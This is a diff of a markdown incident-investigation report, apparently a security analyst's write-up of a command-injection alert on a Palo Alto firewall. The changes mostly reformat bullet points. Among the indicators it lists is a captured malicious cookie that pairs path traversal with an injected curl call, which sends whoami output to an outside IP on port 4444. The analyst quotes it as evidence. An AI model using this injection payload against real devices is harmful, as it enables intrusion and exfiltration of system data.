@@ -103,14 +103,6 @@ Palo Alto firewall (172.16.17.139) was targeted via command injection.  CVE-2024
 
 ## 4. Endpoint Investigation
 
-### Process Tree
-
-```
-Parent Process
-└── Child Process
-    └── Grandchild Process
-```
-
 ### Suspicious Processes
 
 -None
@@ -149,21 +141,23 @@ No history
 
 #### IP Addresses
 
--144.172.79.92
+- 144.172.79.92
 
 #### Domains
 
--cloudzy.com
+- cloudzy.com
 
 #### URLs
 
--172.16.17.139/global-protect/login.esp
--this is a standard VPN login action.  Not necessary malicious
+- 172.16.17.139/global-protect/login.esp
+
+- this is a standard VPN login action.  Not necessary malicious
 
 #### Cookie
 
--SESSID=./../../../opt/panlogs/tmp/device_telemetry/hour/aaa`curl${IFS}144.172.79.92:4444?user=$(whoami)
--this is the most suspect item.  This cookie attempts to traverse directories and run commands via the shell.  Inspection of the endpoint reveals no such processes ran.
+- SESSID=./../../../opt/panlogs/tmp/device_telemetry/hour/aaa`curl${IFS}144.172.79.92:4444?user=$(whoami)
+
+- this is the most suspect item.  This cookie attempts to traverse directories and run commands via the shell.  Inspection of the endpoint reveals no such processes ran.
 
 ---
 
